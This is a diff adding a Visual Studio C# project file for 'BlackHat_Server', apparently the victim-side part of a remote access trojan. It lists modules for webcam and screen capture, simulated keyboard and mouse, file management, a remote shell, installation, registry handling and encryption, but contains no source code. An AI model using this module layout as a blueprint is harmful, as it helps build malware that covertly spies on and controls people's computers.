@@ -1,0 +1,128 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>8.0.30703</ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{DE808F3E-EF0D-4A6D-A71F-5AD955DA6FD4}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>BlackHat_Server</RootNamespace>
+    <AssemblyName>BlackHat_Server</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <SccProjectName>SAK</SccProjectName>
+    <SccLocalPath>SAK</SccLocalPath>
+    <SccAuxPath>SAK</SccAuxPath>
+    <SccProvider>SAK</SccProvider>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Muduli\WebCam\CapCam.cs" />
+    <Compile Include="Class\CreateStClient.cs" />
+    <Compile Include="Class\InstallClass.cs" />
+    <Compile Include="Class\DosRunner.cs" />
+    <Compile Include="Muduli\Desktop\DesktopAgent.cs" />
+    <Compile Include="Muduli\File Manager\FileManAction.cs" />
+    <Compile Include="Class\Crypt\File_Des.cs" />
+    <Compile Include="Class\Image Classes\ImageWorker.cs" />
+    <Compile Include="Muduli\File Manager\ListFiles.cs" />
+    <Compile Include="Class\Comunicator\MsgFileManager.cs" />
+    <Compile Include="Muduli\File Manager\FileManager.cs" />
+    <Compile Include="Class\ModuleStarter.cs" />
+    <Compile Include="Muduli\KeepAlive.cs" />
+    <Compile Include="Class\Connection.cs" />
+    <Compile Include="Class\Crypt\Text_Des.cs" />
+    <Compile Include="Class\CmdInterpreter.cs" />
+    <Compile Include="Form1.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.cs">
+      <DependentUpon>Form1.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Class\GetInfo.cs" />
+    <Compile Include="Class\Guardian.cs" />
+    <Compile Include="Class\Comunicator\MsgManager.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Class\ST_Client.cs" />
+    <Compile Include="Muduli\File Manager\Search.cs" />
+    <Compile Include="Muduli\Desktop\ScreenCapture.cs" />
+    <Compile Include="Muduli\Desktop\VirtualMouse.cs" />
+    <Compile Include="Class\UnivoqueID.cs" />
+    <Compile Include="Muduli\Desktop\VirtualKeyboard.cs" />
+    <Compile Include="Class\ResUtil.cs" />
+    <Compile Include="Class\RegistryManager.cs" />
+    <Compile Include="Muduli\Server Manager\ServerAgent.cs" />
+    <Compile Include="Muduli\WebCam\WebCamAgent.cs" />
+    <Compile Include="Muduli\System Info\SystemAgent.cs" />
+    <Compile Include="Muduli\System Info\WindowsManager.cs" />
+    <Compile Include="Muduli\Remote Shell\RemoteShellAgent.cs" />
+    <Compile Include="Muduli\Remote Shell\ShellWorker.cs" />
+    <Compile Include="WindowStyle.cs" />
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.cs</DependentUpon>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <Compile Include="Properties\Resources.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Resources.resx</DependentUpon>
+      <DesignTime>True</DesignTime>
+    </Compile>
+    <None Include="app.config" />
+    <None Include="Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+    <Compile Include="Properties\Settings.Designer.cs">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Info.txt" />
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
